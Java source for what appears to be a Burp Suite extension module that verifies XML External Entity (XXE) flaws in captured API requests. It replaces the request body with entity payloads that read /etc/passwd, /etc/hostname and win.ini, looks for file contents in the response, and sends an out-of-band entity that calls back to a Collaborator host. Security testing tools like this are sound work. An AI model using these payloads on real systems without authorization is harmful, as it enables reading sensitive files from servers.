package com.flechazo.apisentinel.detection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.flechazo.apisentinel.logging.LeveledLogger;
import com.flechazo.apisentinel.model.ApiEntry;
import com.flechazo.apisentinel.util.HttpMessageUtils;

import java.util.List;

/** XXE 验证器——内联实体读文件 + OOB 回连。 */
public class XxeProbeVerifier {

    public record XxePayload(String xml, String technique, String os) {}

    private static final List<XxePayload> INBAND_PAYLOADS = List.of(
            new XxePayload(
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                    "classic-entity", "linux"),
            new XxePayload(
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>",
                    "hostname-read", "linux"),
            new XxePayload(
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>",
                    "classic-entity", "windows")
    );

    public record XxeResult(
            boolean confirmed,
            String mode,
            String technique,
            String evidenceSnippet,
            String oobProbe,
            boolean wafBlocked,
            String detail,
            String sentRequest,
            String receivedResponse,
            int statusCode,
            long elapsedMs
    ) {
        public static XxeResult notConfirmed(String detail) {
            return new XxeResult(false, null, null, null, null, false, detail, null, null, 0, 0);
        }
    }

    private final MontoyaApi api;
    private final LeveledLogger logger;
    private final OobService oobService;
    private final WafDetector wafDetector;
    private final boolean wafDetectionEnabled;

    public XxeProbeVerifier(MontoyaApi api, LeveledLogger logger,
                            OobService oobService, boolean wafDetectionEnabled) {
        this.api = api;
        this.logger = logger;
        this.oobService = oobService;
        this.wafDetector = new WafDetector(logger);
        this.wafDetectionEnabled = wafDetectionEnabled;
    }

    public XxeResult verify(ApiEntry entry, String mode, String targetOs) {
        String raw = entry.getLastRawRequest();
        if (raw == null || raw.isEmpty()) {
            return XxeResult.notConfirmed("无捕获请求，无法验证");
        }

        boolean tryInband = mode == null || mode.isBlank()
                || "auto".equalsIgnoreCase(mode) || "inband".equalsIgnoreCase(mode);
        boolean tryOob = mode == null || mode.isBlank()
                || "auto".equalsIgnoreCase(mode) || "oob".equalsIgnoreCase(mode);

        // In-band: replace body with XXE payload
        if (tryInband) {
            XxeResult r = tryInbandPayloads(entry, raw, targetOs);
            if (r != null && r.confirmed()) return r;
        }

        // OOB: inject entity that calls back to Collaborator
        if (tryOob && oobService != null && oobService.isCollaboratorMode()) {
            XxeResult r = tryOob(entry, raw);
            if (r != null) return r;
        }

        return XxeResult.notConfirmed("XXE 内联 payload 未在响应中发现文件内容特征，OOB 探针已发送（如可用），请稍后调用 check_oob_results 确认");
    }

    private XxeResult tryInbandPayloads(ApiEntry entry, String raw, String targetOs) {
        boolean tryLinux = targetOs == null || targetOs.isBlank()
                || "auto".equalsIgnoreCase(targetOs) || "linux".equalsIgnoreCase(targetOs);
        boolean tryWindows = targetOs == null || targetOs.isBlank()
                || "auto".equalsIgnoreCase(targetOs) || "windows".equalsIgnoreCase(targetOs);

        int wafBlocked = 0;
        int attempted = 0;

        for (XxePayload xxe : INBAND_PAYLOADS) {
            if ("linux".equals(xxe.os()) && !tryLinux) continue;
            if ("windows".equals(xxe.os()) && !tryWindows) continue;
            if (attempted >= 4) break;
            attempted++;

            String mutated = replaceBodyWithXml(raw, xxe.xml());
            Probe probe = send(entry, mutated);
            if (probe == null) continue;

            if (isWafBlocked(probe)) {
                wafBlocked++;
                continue;
            }

            String body = HttpMessageUtils.bodyOf(probe.rawResponse);
            String evidence = detectFileContent(body);
            if (evidence != null) {
                String detail = "XXE 确认 (in-band): " + xxe.technique() + " → 响应含文件内容";
                if (logger != null) {
                    logger.info("[XXE] %s %s", entry.getApiPath(), detail);
                }
                return new XxeResult(true, "inband", xxe.technique(), evidence, null, false,
                        detail, probe.rawRequest, probe.rawResponse, probe.status, probe.elapsed);
            }
        }

        if (wafBlocked > 0 && wafBlocked >= attempted) {
            return new XxeResult(false, "inband", null, null, null, true,
                    "XXE payload 全被 WAF 拦截", null, null, 0, 0);
        }
        return null;
    }

    private XxeResult tryOob(ApiEntry entry, String raw) {
        String oobPayload = oobService.generatePayload(
                entry.getId(), entry.getApiPath(), "body_xml", "XXE");
        String hostname = oobPayload;

        String xml = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://"
                + hostname + "/xxe\">]><root>&xxe;</root>";
        String mutated = replaceBodyWithXml(raw, xml);
        Probe probe = send(entry, mutated);
        if (probe == null) {
            return new XxeResult(false, "oob", "oob-entity", null, hostname, false,
                    "OOB XXE 探针请求失败", null, null, 0, 0);
        }
        if (isWafBlocked(probe)) {
            return new XxeResult(false, "oob", "oob-entity", null, hostname, true,
                    "OOB XXE payload 被 WAF 拦截", probe.rawRequest, probe.rawResponse, probe.status, probe.elapsed);
        }

        return new XxeResult(false, "oob", "oob-entity", null, hostname, false,
                "OOB XXE 探针已发送 (" + hostname + ")，请调用 check_oob_results 确认回连",
                probe.rawRequest, probe.rawResponse, probe.status, probe.elapsed);
    }

    private String replaceBodyWithXml(String rawRequest, String xmlBody) {
        String headers = HttpMessageUtils.headerSection(rawRequest);
        // Ensure Content-Type is application/xml
        if (!headers.toLowerCase().contains("content-type:")) {
            headers = headers.trim() + "\r\nContent-Type: application/xml";
        } else {
            headers = headers.replaceFirst("(?i)content-type:\\s*[^\\r\\n]+",
                    "Content-Type: application/xml");
        }
        // Update Content-Length
        int len = xmlBody.getBytes(java.nio.charset.StandardCharsets.UTF_8).length;
        if (headers.toLowerCase().contains("content-length:")) {
            headers = headers.replaceFirst("(?i)content-length:\\s*\\d+",
                    "Content-Length: " + len);
        } else {
            headers = headers.trim() + "\r\nContent-Length: " + len;
        }
        return headers + "\r\n\r\n" + xmlBody;
    }

    private static String detectFileContent(String body) {
        if (body == null) return null;
        for (String sig : new String[]{"root:x:0:0:", "root:*:0:0:", "[fonts]", "[extensions]"}) {
            int idx = body.indexOf(sig);
            if (idx >= 0) {
                return body.substring(idx, Math.min(idx + 80, body.length()));
            }
        }
        return null;
    }

    private boolean isWafBlocked(Probe p) {
        if (!wafDetectionEnabled) return false;
        return wafDetector.detect(p.rawResponse, p.status, p.elapsed).isBlocked();
    }

    private Probe send(ApiEntry entry, String rawRequest) {
        try {
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(HttpRequest.httpRequest(
                    ActiveProbeExecutor.resolveService(entry), rawRequest));
            long elapsed = System.currentTimeMillis() - start;
            int status = rr.response() != null ? rr.response().statusCode() : 0;
            String rawResp = rr.response() != null ? rr.response().toString() : "";
            return new Probe(rawRequest, rawResp, status, elapsed);
        } catch (Exception e) {
            if (logger != null) logger.warn("[XXE] 请求失败: %s", e.getMessage());
            return null;
        }
    }

    private static final class Probe {
        final String rawRequest;
        final String rawResponse;
        final int status;
        final long elapsed;
        Probe(String rawRequest, String rawResponse, int status, long elapsed) {
            this.rawRequest = rawRequest;
            this.rawResponse = rawResponse;
            this.status = status;
            this.elapsed = elapsed;
        }
    }
}
